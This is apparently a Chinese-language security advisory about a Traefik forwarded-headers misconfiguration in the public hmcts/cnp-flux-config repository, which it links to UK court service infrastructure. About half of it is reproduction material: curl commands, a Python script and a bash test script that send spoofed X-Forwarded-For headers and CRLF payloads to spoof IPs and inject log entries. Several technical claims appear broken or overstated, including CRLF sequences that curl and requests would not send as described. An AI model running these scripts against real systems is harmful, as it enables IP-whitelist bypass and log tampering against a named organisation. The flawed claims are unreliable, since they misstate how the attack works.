# CVE-2025-XXXXX: HTTP Header Injection in hmcts/cnp-flux-config Traefik Configuration

## 基本信息

- **CVE ID**: CVE-2025-XXXXX (待分配)
- **项目**: hmcts/cnp-flux-config
- **发现日期**: 2025-12-28
- **报告者**: Security Research
- **严重程度**: High (CVSS 7.5)

## 漏洞描述

hmcts/cnp-flux-config 项目中的 Traefik 配置存在 HTTP Header Injection (CRLF Injection) 漏洞。配置文件中设置了 `forwardedHeaders.insecure=true` 但没有配置 `trustedIPs` 白名单，导致 Traefik 信任所有来源的 X-Forwarded-* 头。

## 受影响文件

- `apps/admin/traefik2/ptl-intsvc/00.yaml`

## 漏洞配置

```yaml
additionalArguments:
  - "--entryPoints.web.forwardedHeaders.insecure=true"
  - "--entryPoints.websecure.forwardedHeaders.insecure=true"
```

## 漏洞详情

### 问题分析

1. **配置问题**: `insecure=true` 且**没有配置 trustedIPs**
2. **影响**: Traefik 会信任**所有来源**的 X-Forwarded-* 头
3. **攻击向量**: 攻击者可以直接向 Traefik 发送恶意请求

### 攻击场景

```
攻击者 → Traefik (insecure: true, 无白名单) → 后端服务
```

### 攻击载荷示例

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1\r\nX-Injected-Header: malicious-value\r\n
```

## 影响评估

### CVSS 3.1 评分

- **Base Score**: 7.5 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N

### 实际影响

1. **日志注入** ✅ **几乎肯定发生**
   - 后端服务会记录 X-Forwarded-For 到日志
   - 攻击者可以注入恶意内容污染日志
   - 影响日志分析和安全审计

2. **IP 欺骗** ✅ **很可能发生**
   - 如果后端服务使用 X-Forwarded-For 进行访问控制
   - 攻击者可以伪造 IP 地址
   - 可能绕过 IP 白名单和地理位置限制

3. **响应拆分** ⚠️ **可能发生**
   - 如果后端在响应中回显 X-Forwarded-For
   - 可能导致缓存投毒和 XSS

## 威胁模型

### 攻击前提条件

1. Traefik 配置了 `forwardedHeaders.insecure=true`
2. 没有配置 `trustedIPs` 白名单
3. 攻击者能够直接访问 Traefik 或通过未受信任的代理访问

### 攻击步骤

1. 攻击者构造包含恶意 X-Forwarded-For 头的 HTTP 请求
2. Traefik 信任并转发该头到后端服务
3. 后端服务处理该头，可能导致日志注入或 IP 欺骗

## 修复建议

### 方案 1: 移除 insecure 配置（推荐）

```yaml
# 移除这两行
# - "--entryPoints.web.forwardedHeaders.insecure=true"
# - "--entryPoints.websecure.forwardedHeaders.insecure=true"
```

### 方案 2: 配置 trustedIPs 白名单

```yaml
additionalArguments:
  - "--entryPoints.web.forwardedHeaders.insecure=true"
  - "--entryPoints.web.forwardedHeaders.trustedIPs=10.0.0.0/8,172.16.0.0/12,192.168.0.0/16"
  - "--entryPoints.websecure.forwardedHeaders.insecure=true"
  - "--entryPoints.websecure.forwardedHeaders.trustedIPs=10.0.0.0/8,172.16.0.0/12,192.168.0.0/16"
```

### 方案 3: 使用 Proxy Protocol（如果使用负载均衡器）

如果使用负载均衡器（如 AWS ALB、GCP LB），可以使用 Proxy Protocol 而不是 X-Forwarded-For。

## 漏洞复现

### 环境准备

1. **克隆项目仓库**:
   ```bash
   git clone https://github.com/hmcts/cnp-flux-config.git
   cd cnp-flux-config
   ```

2. **检查漏洞配置**:
   ```bash
   # 查看配置文件
   cat apps/admin/traefik2/ptl-intsvc/00.yaml | grep -A 5 "additionalArguments"
   ```

3. **部署 Traefik** (使用 Kubernetes/Flux):
   ```bash
   # 应用配置（需要 Kubernetes 集群和 Flux）
   kubectl apply -f apps/admin/traefik2/ptl-intsvc/00.yaml
   ```

### 漏洞复现步骤

#### 步骤 1: 确认 Traefik 配置

检查 Traefik 是否使用了不安全的配置：

```bash
# 检查 Traefik Pod 的启动参数
kubectl get pods -n <namespace> -l app=traefik -o jsonpath='{.items[0].spec.containers[0].command}' | jq

# 应该看到包含以下参数：
# "--entryPoints.web.forwardedHeaders.insecure=true"
# "--entryPoints.websecure.forwardedHeaders.insecure=true"
# 但没有 trustedIPs 配置
```

#### 步骤 2: 测试日志注入漏洞

**攻击载荷 1: 基础日志注入**

```bash
# 使用 curl 发送恶意请求
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     -H "X-Forwarded-Host: evil.com" \
     http://<traefik-ip>:80/

# 或者使用更复杂的注入
curl -v -H "X-Forwarded-For: 127.0.0.1\r\nX-Injected-Header: malicious-value" \
     http://<traefik-ip>:80/
```

**攻击载荷 2: CRLF 注入到日志**

```bash
# 注入换行符污染日志
curl -v -H "X-Forwarded-For: 127.0.0.1%0D%0AX-Log-Injection: [INJECTED]%0D%0A" \
     http://<traefik-ip>:80/

# 使用 Python 脚本发送精确的 CRLF
python3 << 'EOF'
import requests

headers = {
    'X-Forwarded-For': '127.0.0.1\r\nX-Injected: malicious\r\n',
    'X-Forwarded-Proto': 'https',
    'X-Forwarded-Host': 'evil.com'
}

response = requests.get('http://<traefik-ip>:80/', headers=headers)
print(response.status_code)
EOF
```

#### 步骤 3: 测试 IP 欺骗漏洞

```bash
# 伪造本地 IP 地址
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     http://<traefik-ip>:80/

# 伪造内网 IP 地址
curl -v -H "X-Forwarded-For: 10.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     http://<traefik-ip>:80/

# 如果后端有 IP 白名单，尝试绕过
curl -v -H "X-Forwarded-For: 192.168.1.100" \
     http://<traefik-ip>:80/
```

#### 步骤 4: 验证漏洞

**检查后端服务日志**:

```bash
# 查看后端服务日志（假设是 Kubernetes 部署）
kubectl logs -n <namespace> <backend-pod-name> | grep -i "forwarded"

# 应该能看到注入的恶意内容出现在日志中
# 例如：
# [2025-12-28] IP: 127.0.0.1
# X-Injected-Header: malicious-value
```

**检查 Traefik 访问日志**:

```bash
# 如果 Traefik 启用了访问日志
kubectl logs -n <namespace> <traefik-pod-name> | tail -20

# 应该能看到伪造的 IP 地址
```

### 预期结果

1. **日志注入成功**: 后端服务日志中包含注入的恶意内容（如 `X-Injected-Header: malicious-value`）
2. **IP 欺骗成功**: 后端服务记录的 IP 地址是伪造的（如 `127.0.0.1` 而不是真实攻击者 IP）
3. **无验证**: Traefik 没有验证 X-Forwarded-* 头的来源，直接信任并转发

### 验证方法

#### 自动化测试脚本

```bash
#!/bin/bash
# test_vulnerability.sh

TRAEFIK_IP="<traefik-ip>"
TRAEFIK_PORT="80"

echo "[*] Testing HTTP Header Injection vulnerability"
echo "[*] Target: $TRAEFIK_IP:$TRAEFIK_PORT"

# Test 1: Basic injection
echo "[+] Test 1: Basic header injection"
curl -s -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Injected-Test: vulnerability-exists" \
     http://$TRAEFIK_IP:$TRAEFIK_PORT/ > /dev/null

# Test 2: CRLF injection
echo "[+] Test 2: CRLF injection"
curl -s -H "X-Forwarded-For: 127.0.0.1%0D%0AX-Log-Injection: CRLF-TEST" \
     http://$TRAEFIK_IP:$TRAEFIK_PORT/ > /dev/null

# Test 3: IP spoofing
echo "[+] Test 3: IP spoofing"
curl -s -H "X-Forwarded-For: 10.0.0.1" \
     -H "X-Real-IP: 192.168.1.100" \
     http://$TRAEFIK_IP:$TRAEFIK_PORT/ > /dev/null

echo "[*] Check backend logs to verify injection success"
```

#### 使用 Burp Suite 或 OWASP ZAP

1. 配置代理指向 Traefik 实例
2. 拦截请求，修改 `X-Forwarded-For` 头
3. 添加恶意内容：`X-Forwarded-For: 127.0.0.1\r\nX-Injected: test`
4. 发送请求并检查后端日志

### 注意事项

- ⚠️ **仅用于授权测试**: 此漏洞复现方法仅应用于已授权的安全测试环境
- ⚠️ **不要在生产环境测试**: 不要在未授权的情况下测试生产环境
- ✅ **记录所有步骤**: 记录所有测试步骤和结果，用于漏洞报告

## 时间线

- 2025-12-28: 漏洞发现
- 2025-12-28: 报告生成

## 参考

- Traefik 文档: https://doc.traefik.io/traefik/routing/entrypoints/#forwarded-headers
- OWASP HTTP Header Injection: https://owasp.org/www-community/attacks/HTTP_Header_Injection

## 备注

这是英国司法部 (HMCTS) 的配置，可能在生产环境使用。建议尽快修复。

